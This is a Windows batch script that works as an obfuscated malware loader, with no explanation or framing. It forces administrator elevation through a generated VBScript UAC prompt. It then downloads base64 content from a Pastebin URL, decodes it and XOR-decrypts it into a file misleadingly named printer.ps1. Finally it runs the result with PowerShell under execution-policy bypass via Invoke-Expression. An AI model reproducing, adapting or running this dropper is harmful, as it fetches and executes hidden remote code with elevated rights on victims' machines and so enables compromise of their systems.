@echo off
:: Ensure admin privileges
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params=%*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

:: Download the base64-encoded content from Pastebin
powershell -Command "Invoke-WebRequest -Uri 'https://pastebin.com/raw/qHiHS8pY' -OutFile $env:TEMP\rb.ps1"

:: Decode the base64 content
powershell -Command "Add-Content $env:TEMP\printer.ps1 -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-Content $env:TEMP\rb.ps1 -Raw))))"

:: Print the decoded content to confirm
echo Decrypted and decoded script content:
type $env:TEMP\printer.ps1

:: Decrypt and execute the content
powershell -NoP -NonI -Ep Bypass ^
    "Get-Content $env:TEMP\printer.ps1 | % { -join [char[]]($_ -split ',' | ForEach-Object { [int]$_ -bxor 101 }) } | Invoke-Expression"

exit
